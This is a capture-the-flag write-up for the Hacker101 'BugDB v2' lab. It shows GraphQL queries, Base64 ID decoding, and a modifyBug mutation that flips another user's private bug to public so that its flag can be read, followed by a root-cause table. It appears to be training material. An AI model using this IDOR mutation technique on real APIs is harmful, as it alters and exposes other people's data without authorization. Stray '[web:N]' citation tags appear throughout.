# 🐞 BugDB v2

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Easy` &nbsp;|&nbsp; **Flags:** `1/1` ✅

---

## ⛓️ Attack Chain

```text
Inspect GraphQL schema → List users and bugs → Decode bug ID pattern → Use mutation to flip private flag → Re‑query bug text → Read flag
```

---

## 🔍 Application Overview

BugDB v2 is another GraphQL‑backed bug tracker, similar to v1 but with an extra **mutation** root type that lets clients modify bug records.[web:14][web:19]  
The idea of the lab is that you can abuse this mutation to change a hidden bug from private to public and then read its flag from the text field.[web:6][web:14]

---

## 🚩 Flag — Abusing GraphQL Mutations

**Step 1 — Explore the schema (queries + mutations)**

- Open the built‑in GraphiQL UI or send an introspection query to the GraphQL endpoint.  
- In the docs, you should see:
  - A `Query` root (for `allUsers`, `allBugs`, etc.).  
  - A `Mutation` root (often something like `modifyBug` or similar).[web:14][web:19]

Use a basic query to see all users:

```graphql
{
  allUsers {
    id
    username
  }
}
```

Then list all bugs:

```graphql
{
  allBugs {
    id
    text
    private
  }
}
```

You’ll notice only one bug is visible and marked as not private, which is a hint that there are more bugs hidden behind different IDs.[web:6][web:14]

---

**Step 2 — Decode the bug ID format**

The visible bug’s `id` is usually a Base64‑encoded string like `YnVnczox`.[web:6][web:14]  

- Decode it (Python, CyberChef, whatever):

```python
import base64
print(base64.b64decode("YnVnczox"))
```

- The decoded value shows a pattern like `bugs:1`, meaning the internal identifiers follow `bugs:<number>`.[web:6][web:14]

This tells you there is likely a `bugs:2` record that you cannot see yet.

---

**Step 3 — Use the mutation to flip `private` on another bug**

In the schema docs, inspect the mutation field; it will look roughly like this conceptually:

```graphql
mutation {
  modifyBug(id: ID!, private: Boolean, text: String, ...) {
    ok
  }
}
```

You do not need to change every field, only the `id` and `private` are important.  
Craft a mutation to set `private: false` for bug ID `2`:

```graphql
mutation {
  modifyBug(id: 2, private: false) {
    ok
  }
}
```

Run it. If the response returns `ok: true`, your unauthorized update succeeded and the hidden bug is now marked as non‑private.[web:6][web:14]

---

**Step 4 — Re‑query all bugs and read the flag**

Now run the bug listing query again:

```graphql
{
  allBugs {
    id
    text
    private
  }
}
```

You should now see another bug (the one with `id` 2) with `private: false`, and its `text` field will contain the CTF flag.[web:6][web:14]  

Copy that flag and submit it to solve BugDB v2.

---

## 🧠 Why It Works

| Vulnerability                  | Root Cause                                                                 |
|--------------------------------|----------------------------------------------------------------------------|
| Broken authorization on mutate | `modifyBug` mutation lets any user update any bug by ID                    |
| Predictable internal IDs       | Base64‑encoded `bugs:<number>` makes guessing other records trivial        |
| Sensitive data in bug text     | The flag is stored in the `text` field of a bug that should stay private  |

---

## 📋 Handy GraphQL Snippets

List users:

```graphql
{
  allUsers {
    id
    username
  }
}
```

List bugs:

```graphql
{
  allBugs {
    id
    text
    private
  }
}
```

Flip private flag on bug `2`:

```graphql
mutation {
  modifyBug(id: 2, private: false) {
    ok
  }
}
```
